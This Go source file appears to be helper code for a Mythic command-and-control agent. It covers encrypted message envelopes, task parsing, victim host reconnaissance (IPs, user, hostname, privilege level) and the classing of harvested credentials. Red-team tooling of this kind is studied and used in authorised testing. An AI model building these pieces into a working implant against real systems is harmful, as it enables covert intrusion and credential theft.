package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
)

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padtext...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, fmt.Errorf("数据为空")
	}
	padding := int(data[length-1])
	if padding > length || padding > aes.BlockSize {
		return nil, fmt.Errorf("无效的填充")
	}
	return data[:length-padding], nil
}

func aes256Encrypt(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plaintext = pkcs7Pad(plaintext, aes.BlockSize)
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}
	mode := cipher.NewCBCEncrypter(block, iv)
	ciphertext := make([]byte, len(plaintext))
	mode.CryptBlocks(ciphertext, plaintext)
	h := hmac.New(sha256.New, key)
	h.Write(iv)
	h.Write(ciphertext)
	mac := h.Sum(nil)
	result := append(iv, ciphertext...)
	result = append(result, mac...)
	return result, nil
}

func aes256Decrypt(data []byte, key []byte) ([]byte, error) {
	if len(data) < aes.BlockSize+sha256.Size {
		return nil, fmt.Errorf("数据太短")
	}
	iv := data[:aes.BlockSize]
	mac := data[len(data)-sha256.Size:]
	ciphertext := data[aes.BlockSize : len(data)-sha256.Size]
	h := hmac.New(sha256.New, key)
	h.Write(iv)
	h.Write(ciphertext)
	expectedMac := h.Sum(nil)
	if !hmac.Equal(mac, expectedMac) {
		return nil, fmt.Errorf("HMAC 验证失败")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("密文长度不是块大小的倍数")
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)
	return pkcs7Unpad(plaintext)
}

func splitMythicEnvelope(decoded []byte) (string, []byte, error) {
	uuidPart := string(decoded[:36])
	if !looksLikeUUID(uuidPart) {
		return "", nil, fmt.Errorf("响应前缀不是有效 UUID: %q", uuidPart)
	}
	return uuidPart, decoded[36:], nil
}

func looksLikeUUID(value string) bool {
	if len(value) != 36 {
		return false
	}
	for _, index := range []int{8, 13, 18, 23} {
		if value[index] != '-' {
			return false
		}
	}
	for index, ch := range value {
		if index == 8 || index == 13 || index == 18 || index == 23 {
			continue
		}
		if (ch < '0' || ch > '9') && (ch < 'a' || ch > 'f') && (ch < 'A' || ch > 'F') {
			return false
		}
	}
	return true
}

func filterValidTasks(tasks []Task) []Task {
	validTasks := make([]Task, 0, len(tasks))
	for _, task := range tasks {
		if err := validateTask(task); err != nil {
			continue
		}
		validTasks = append(validTasks, task)
	}
	return validTasks
}

func validateTask(task Task) error {
	if task.ID == "" {
		return errors.New("任务缺少 id")
	}
	if task.Command == "" {
		return fmt.Errorf("任务 %s 缺少 command", task.ID)
	}
	return nil
}

func firstNonEmpty(values ...string) string {
	for _, value := range values {
		if strings.TrimSpace(value) != "" {
			return value
		}
	}
	return ""
}

func getLocalIPs() []string {
	ips := []string{}
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ips
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	return ips
}

func getOSInfo() string {
	return runtime.GOOS
}

func getCurrentUser() string {
	u, err := user.Current()
	if err != nil {
		return "unknown"
	}
	return u.Username
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getIntegrityLevel() int {
	if runtime.GOOS == "windows" {
		return 2
	}
	if os.Getuid() == 0 {
		return 4
	}
	return 2
}

func currentMythicHost() string {
	return strings.TrimSpace(getHostname())
}

func intPointer(value int) *int {
	return &value
}

func stringPointer(value string) *string {
	return &value
}

func looksCredentialValue(value string) bool {
	if len(value) < 3 {
		return false
	}
	if strings.Contains(value, " ") {
		return false
	}
	return true
}

func normalizeCredentialType(value string) string {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "plaintext", "":
		return "plaintext"
	case "certificate", "hash", "key", "ticket", "cookie":
		return strings.ToLower(strings.TrimSpace(value))
	default:
		return "plaintext"
	}
}
